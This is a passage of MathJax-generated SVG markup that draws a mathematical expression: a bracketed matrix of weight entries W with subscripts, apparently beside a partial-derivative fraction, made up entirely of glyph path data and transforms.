635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z\"/></g></g></g><g data-mml-node=\"mrow\" transform=\"translate(237.9,-345.6) scale(0.707)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(605,-150) scale(0.707)\"><path data-c=\"1D437\" d=\"M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z\"/></g></g></g><rect width=\"1513.2\" height=\"60\" x=\"120\" y=\"220\"/></g></g></g></g><g data-mml-node=\"mo\" transform=\"translate(10208.7,0)\"><path data-c=\"23A4\" d=\"M0 1070V1154H347V-645H263V1070H0Z\" transform=\"translate(0,2685.9)\"/><path data-c=\"23A6\" d=\"M263 -560V1155H347V-644H0V-560H263Z\" transform=\"translate(0,-2695.9)\"/><svg width=\"667\" height=\"3781.9\" y=\"-1640.9\" x=\"0\" viewbox=\"0 945.5 667 3781.9\"><path data-c=\"23A5\" d=\"M263 0V602H347V0H263Z\" transform=\"scale(1,9.423)\"/></svg></g></g><g data-mml-node=\"mo\" transform=\"translate(14065,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mrow\" transform=\"translate(15120.8,0)\"><g data-mml-node=\"mo\"><path data-c=\"23A1\" d=\"M319 -645V1154H666V1070H403V-645H319Z\" transform=\"translate(0,2136.8)\"/><path data-c=\"23A3\" d=\"M319 -644V1155H403V-560H666V-644H319Z\" transform=\"translate(0,-2146.8)\"/><svg width=\"667\" height=\"2683.5\" y=\"-1091.8\" x=\"0\" viewbox=\"0 670.9 667 2683.5\"><path data-c=\"23A2\" d=\"M319 0V602H403V0H319Z\" transform=\"scale(1,6.687)\"/></svg></g><g data-mml-node=\"mtable\" transform=\"translate(667,0)\"><g data-mml-node=\"mtr\" transform=\"translate(0,2540.8)\"><g data-mml-node=\"mtd\" transform=\"translate(194.8,0)\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(977,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mn\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(500,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(778,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g></g></g><g data-mml-node=\"mtd\" transform=\"translate(3515.1,0)\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(977,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mn\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(500,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(778,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g></g></g><g data-mml-node=\"mtd\" transform=\"translate(6695.6,0)\"><g data-mml-node=\"mo\"><path data-c=\"22EF\" d=\"M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250ZM525 250Q525 274 542 292T585 310Q609 310 627 294T646 251Q646 226 629 208T586 190T543 207T525 250ZM972 250Q972 274 989 292T1032 310Q1056 310 1074 294T1093 251Q1093 226 1076 208T1033 190T990 207T972 250Z\"/></g></g><g data-mml-node=\"mtd\" transform=\"translate(9117.4,0)\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(977,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mi\"><path data-c=\"1D437\" d=\"M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(828,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(1106,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g></g></g></g><g data-mml-node=\"mtr\" transform=\"translate(0,1103.6)\"><g data-mml-node=\"mtd\" transform=\"translate(194.8,0)\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(977,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mn\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(500,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(778,0)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g></g></g></g><g data-mml-node=\"mtd\" transform=\"translate(3515.1,0)\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(977,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mn\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(500,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(778,0)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g></g></g></g><g data-mml-node=\"mtd\" transform=\"translate(6695.6,0)\"><g data-mml-node=\"mo\"><path data-c=\"22EF\" d=\"M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250ZM525 250Q525 274 542 292T585 310Q609 310 627 294T646 251Q646 226 629 208T586 190T543 207T525 250ZM972 250Q972 274 989 292T1032 310Q1056 310 1074 294T1093 251Q1093 226 1076 208T1033 190T990 207T972 250Z\"/></g></g><g data-mml-node=\"mtd\" transform=\"translate(9117.4,0)\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(977,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mi\"><path data-c=\"1D437\" d=\"M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(828,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(1106,0)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g></g></g></g></g><g data-mml-node=\"mtr\" transform=\"translate(0,-1103.6)\"><g data-mml-node=\"mtd\" transform=\"translate(1021.1,0)\"><g data-mml-node=\"TeXAtom\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mo\"><path data-c=\"22EE\" d=\"M78 30Q78 54 95 72T138 90Q162 90 180 74T199 31Q199 6 182 -12T139 -30T96 -13T78 30ZM78 440Q78 464 95 482T138 500Q162 500 180 484T199 441Q199 416 182 398T139 380T96 397T78 440ZM78 840Q78 864 95 882T138 900Q162 900 180 884T199 841Q199 816 182 798T139 780T96 797T78 840Z\"/></g></g></g><g data-mml-node=\"mtd\" transform=\"translate(4341.4,0)\"><g data-mml-node=\"TeXAtom\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mo\"><path data-c=\"22EE\" d=\"M78 30Q78 54 95 72T138 90Q162 90 180 74T199 31Q199 6 182 -12T139 -30T96 -13T78 30ZM78 440Q78 464 95 482T138 500Q162 500 180 484T199 441Q199 416 182 398T139 380T96 397T78 440ZM78 840Q78 864 95 882T138 900Q162 900 180 884T199 841Q199 816 182 798T139 780T96 797T78 840Z\"/></g></g></g><g data-mml-node=\"mtd\" transform=\"translate(6640.6,0)\"><g data-mml-node=\"mo\"><path data-c=\"22F1\" d=\"M133 760Q133 784 150 802T193 820Q217 820 235 804T254 761Q254 736 237 718T194 700T151 717T133 760ZM580 460Q580 484 597 502T640 520Q664 520 682 504T701 461Q701 436 684 418T641 400T598 417T580 460ZM1027 160Q1027 184 1044 202T1087 220Q1111 220 1129 204T1148 161Q1148 136 1131 118T1088 100T1045 117T1027 160Z\"/></g></g><g data-mml-node=\"mtd\" transform=\"translate(10059.7,0)\"><g data-mml-node=\"TeXAtom\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mo\"><path data-c=\"22EE\" d=\"M78 30Q78 54 95 72T138 90Q162 90 180 74T199 31Q199 6 182 -12T139 -30T96 -13T78 30ZM78 440Q78 464 95 482T138 500Q162 500 180 484T199 441Q199 416 182 398T139 380T96 397T78 440ZM78 840Q78 864 95 882T138 900Q162 900 180 884T199 841Q199 816 182 798T139 780T96 797T78 840Z\"/></g></g></g></g><g data-mml-node=\"mtr\" transform=\"translate(0,-2503.6)\"><g data-mml-node=\"mtd\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(977,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mn\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(500,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(778,0)\"><path data-c=\"1D440\" d=\"M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z\"/></g></g></g></g><g data-mml-node=\"mtd\" transform=\"translate(3320.3,0)\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g 